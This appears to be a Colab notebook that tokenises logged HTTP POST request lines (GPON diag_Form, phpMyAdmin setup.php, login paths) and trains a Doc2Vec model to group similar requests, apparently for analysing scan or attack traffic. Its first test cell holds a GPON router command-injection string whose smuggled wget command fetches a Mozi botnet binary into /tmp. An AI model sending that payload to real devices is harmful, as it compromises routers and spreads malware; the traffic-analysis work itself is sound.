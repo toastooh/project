{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "NLP Preprocessing.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyNjv0MiKyN0hkLbxZwwmzb1",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/toastooh/project/blob/main/Doc2Vector.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2dkiGLZiSxbV",
        "outputId": "dcf73287-0075-48db-ac29-d1fceeba6b7e"
      },
      "source": [
        "#測試用\n",
        "te=\"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon8080;s\"\n",
        "te.replace(\"&\",\" \")\n",
        "noise=[\"&\",\"+\",\";\"]\n",
        "for i in noise:\n",
        "  te=te.replace(i,\" \")\n",
        "re.split(\" \",te)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['XWebPageName=diag',\n",
              " 'diag_action=ping',\n",
              " 'wan_conlist=0',\n",
              " 'dest_host=``',\n",
              " 'wget',\n",
              " 'http://192.168.1.1:8088/Mozi.m',\n",
              " '-O',\n",
              " '->/tmp/gpon8080',\n",
              " 's']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "criekMoCZ8L_",
        "outputId": "b6a4c257-4ba5-4176-d247-5349f1c8a0ef"
      },
      "source": [
        "#測試用\n",
        "st=\"POST /login/comments HTTP/1.1  (application/x-www-form-urlencoded)\"\n",
        "st=st.replace(\"HTTP/1.1\",\"\")\n",
        "re.split(\"/\",st)"
      ],
      "execution_count": 34,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['POST ', 'login', 'comments   (application', 'x-www-form-urlencoded)']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 34
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9Gyv6YpEiQkz",
        "outputId": "301391ba-6df7-4f7d-c3f1-993fbf232d83"
      },
      "source": [
        "#import dataset from google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/gdrive')"
      ],
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Mounted at /content/gdrive\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qFVUkEIcb7YO",
        "outputId": "ee3b2082-a425-4bd4-c291-cf123cd54b6f"
      },
      "source": [
        "#read dataset\n",
        "import pandas as pd\n",
        "data=pd.read_csv(\"/content/gdrive/My Drive/post_for_test.csv\")\n",
        "data['Info']"
      ],
      "execution_count": 43,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0            POST /GponForm/diag_Form?images/ HTTP/1.1 \n",
              "1     POST /login/fcgi-bin/comments HTTP/1.1  (appli...\n",
              "2     POST /login/comments HTTP/1.1  (application/x-...\n",
              "3     POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "4     POST /phpMyAdmin/scripts/setup.php HTTP/1.1  (...\n",
              "5     POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "6     POST /phpMyAdmin/scripts/setup.php HTTP/1.1  (...\n",
              "7     POST /phpMyAdmin/scripts/setup.php HTTP/1.1  (...\n",
              "8     POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "9     POST /login/suse/.br/comments HTTP/1.1  (appli...\n",
              "10                                  POST /sdk HTTP/1.1 \n",
              "11    POST /phpMyAdmin/scripts/setup.php HTTP/1.1  (...\n",
              "12    POST /login/comments HTTP/1.1  (application/x-...\n",
              "13    POST /phpMyAdmin/scripts/setup.php HTTP/1.1  (...\n",
              "14    POST /login/perl/comments HTTP/1.1  (applicati...\n",
              "15    POST /login/comments HTTP/1.1  (application/x-...\n",
              "16    POST /login/comments HTTP/1.1  (application/x-...\n",
              "17    POST /login/perl/m2f/comments HTTP/1.1  (appli...\n",
              "18    POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "19    POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "20    POST /phpmyadmin/scripts/setup.php HTTP/1.1  (...\n",
              "21    POST /login/comments HTTP/1.1  (application/x-...\n",
              "22    POST /login/comments HTTP/1.1  (application/x-...\n",
              "Name: Info, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gmdK3WJVr6pa"
      },
      "source": [
        "#data preprocessing\n",
        "def preprocess(stc):\n",
        "  stc=stc.replace(\"HTTP/1.1\",\"\")\n",
        "  stc=stc.replace(\"/\",\" \")\n",
        "  stc=stc.replace(\"  \",\" \")\n",
        "  stc=stc.replace(\"(\",\"\")\n",
        "  stc=stc.replace(\")\",\"\")\n",
        "  stc=re.split(\" \",stc)\n",
        "  return stc"
      ],
      "execution_count": 120,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UM8lMh-AkEJd",
        "outputId": "30c99dd7-5e91-4c8e-cbb3-42ff07222222"
      },
      "source": [
        "#data preprocessing(continual)\n",
        "lis=[]\n",
        "for i in data['Info']:\n",
        "  lis.append(preprocess(i))\n",
        "for p in lis:\n",
        "  for s in p:\n",
        "    if (s==\"\"):\n",
        "      p.remove(s)\n",
        "lis"
      ],
      "execution_count": 121,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[['POST', 'GponForm', 'diag_Form?images', ''],\n",
              " ['POST',\n",
              "  'login',\n",
              "  'fcgi-bin',\n",
              "  'comments',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpMyAdmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpMyAdmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpMyAdmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'login',\n",
              "  'suse',\n",
              "  '.br',\n",
              "  'comments',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST', 'sdk'],\n",
              " ['POST',\n",
              "  'phpMyAdmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpMyAdmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'perl', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'login',\n",
              "  'perl',\n",
              "  'm2f',\n",
              "  'comments',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST',\n",
              "  'phpmyadmin',\n",
              "  'scripts',\n",
              "  'setup.php',\n",
              "  'application',\n",
              "  'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'],\n",
              " ['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded']]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 121
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KHxqEEr_soQM",
        "outputId": "796c0152-af4c-4df0-e0a0-d7846cf18fb7"
      },
      "source": [
        "#import doc2vector package\n",
        "import nltk\n",
        "nltk.download('punkt')\n",
        "from nltk import pos_tag\n",
        "from nltk.tokenize import word_tokenize\n",
        "import numpy as np\n",
        "nltk.download('averaged_perceptron_tagger')"
      ],
      "execution_count": 147,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[nltk_data] Downloading package punkt to /root/nltk_data...\n",
            "[nltk_data]   Package punkt is already up-to-date!\n",
            "[nltk_data] Downloading package averaged_perceptron_tagger to\n",
            "[nltk_data]     /root/nltk_data...\n",
            "[nltk_data]   Unzipping taggers/averaged_perceptron_tagger.zip.\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "True"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 147
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "U9J1HNjru11R"
      },
      "source": [
        "#function to calculate similarity\n",
        "def cosine(u, v):\n",
        "    return np.dot(u, v) / (np.linalg.norm(u) * np.linalg.norm(v))"
      ],
      "execution_count": 117,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WI5og1FjvAqI",
        "outputId": "5c93d30b-b12a-4af3-a339-585f79ac05ad"
      },
      "source": [
        "#tag sentence data\n",
        "from gensim.models.doc2vec import Doc2Vec, TaggedDocument\n",
        "tagged_data = [TaggedDocument(d, [i]) for i, d in enumerate(lis)]\n",
        "tagged_data"
      ],
      "execution_count": 122,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[TaggedDocument(words=['POST', 'GponForm', 'diag_Form?images', ''], tags=[0]),\n",
              " TaggedDocument(words=['POST', 'login', 'fcgi-bin', 'comments', 'application', 'x-www-form-urlencoded'], tags=[1]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[2]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[3]),\n",
              " TaggedDocument(words=['POST', 'phpMyAdmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[4]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[5]),\n",
              " TaggedDocument(words=['POST', 'phpMyAdmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[6]),\n",
              " TaggedDocument(words=['POST', 'phpMyAdmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[7]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[8]),\n",
              " TaggedDocument(words=['POST', 'login', 'suse', '.br', 'comments', 'application', 'x-www-form-urlencoded'], tags=[9]),\n",
              " TaggedDocument(words=['POST', 'sdk'], tags=[10]),\n",
              " TaggedDocument(words=['POST', 'phpMyAdmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[11]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[12]),\n",
              " TaggedDocument(words=['POST', 'phpMyAdmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[13]),\n",
              " TaggedDocument(words=['POST', 'login', 'perl', 'comments', 'application', 'x-www-form-urlencoded'], tags=[14]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[15]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[16]),\n",
              " TaggedDocument(words=['POST', 'login', 'perl', 'm2f', 'comments', 'application', 'x-www-form-urlencoded'], tags=[17]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[18]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[19]),\n",
              " TaggedDocument(words=['POST', 'phpmyadmin', 'scripts', 'setup.php', 'application', 'x-www-form-urlencoded'], tags=[20]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[21]),\n",
              " TaggedDocument(words=['POST', 'login', 'comments', 'application', 'x-www-form-urlencoded'], tags=[22])]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 122
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6wr1uYaEv_xx",
        "outputId": "548aa667-48fe-4fdd-9868-ea852b1cf453"
      },
      "source": [
        "## Train doc2vec model\n",
        "model = Doc2Vec(tagged_data, vector_size = 20, window = 2, min_count = 1, epochs = 100)\n",
        "\n",
        "'''\n",
        "vector_size = Dimensionality of the feature vectors.\n",
        "window = The maximum distance between the current and predicted word within a sentence.\n",
        "min_count = Ignores all words with total frequency lower than this.\n",
        "alpha = The initial learning rate.\n",
        "'''\n",
        "\n",
        "## Print model vocabulary\n",
        "model.wv.vocab"
      ],
      "execution_count": 123,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba350>,\n",
              " '.br': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bab50>,\n",
              " 'GponForm': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba3d0>,\n",
              " 'POST': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba150>,\n",
              " 'application': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba610>,\n",
              " 'comments': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba490>,\n",
              " 'diag_Form?images': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bac90>,\n",
              " 'fcgi-bin': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba290>,\n",
              " 'login': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba1d0>,\n",
              " 'm2f': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bae50>,\n",
              " 'perl': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bad90>,\n",
              " 'phpMyAdmin': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bae90>,\n",
              " 'phpmyadmin': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba190>,\n",
              " 'scripts': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba890>,\n",
              " 'sdk': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba990>,\n",
              " 'setup.php': <gensim.models.keyedvectors.Vocab at 0x7fa78a4bae10>,\n",
              " 'suse': <gensim.models.keyedvectors.Vocab at 0x7fa78a4baf10>,\n",
              " 'x-www-form-urlencoded': <gensim.models.keyedvectors.Vocab at 0x7fa78a4ba650>}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 123
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 218
        },
        "id": "IGHNMtNJwhPj",
        "outputId": "2f2620ef-ccd6-4b9a-8110-3145e31ba9fd"
      },
      "source": [
        "#test and predict\n",
        "test_doc = preprocess(\"POST /GponForm/diag_Form?images/ HTTP/1.1 \")\n",
        "for s in test_doc:\n",
        "    if (s==\"\"):\n",
        "      test_doc.remove(s)\n",
        "test_doc_vector = model.infer_vector(test_doc)\n",
        "p_lis=model.docvecs.most_similar(positive = [test_doc_vector])\n",
        "print(test_doc)\n",
        "for i in p_lis:\n",
        "  print(i)\n",
        "'''\n",
        "positive = List of sentences that contribute positively.\n",
        "'''"
      ],
      "execution_count": 139,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "['POST', 'GponForm', 'diag_Form?images', '']\n",
            "(17, 0.9428595304489136)\n",
            "(0, 0.919684886932373)\n",
            "(9, 0.9179034233093262)\n",
            "(1, 0.9012743830680847)\n",
            "(13, 0.8086608052253723)\n",
            "(14, 0.7326759099960327)\n",
            "(12, 0.7234779596328735)\n",
            "(20, 0.7135027647018433)\n",
            "(3, 0.6768205165863037)\n",
            "(11, 0.6767228245735168)\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'\\npositive = List of sentences that contribute positively.\\n'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 139
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "99ali9SO2otQ",
        "outputId": "3ba68240-47c1-4a57-ab0f-8144625b67a4"
      },
      "source": [
        "pos_tag(['POST'])"
      ],
      "execution_count": 150,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[('POST', 'NN')]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 150
        }
      ]
    }
  ]
}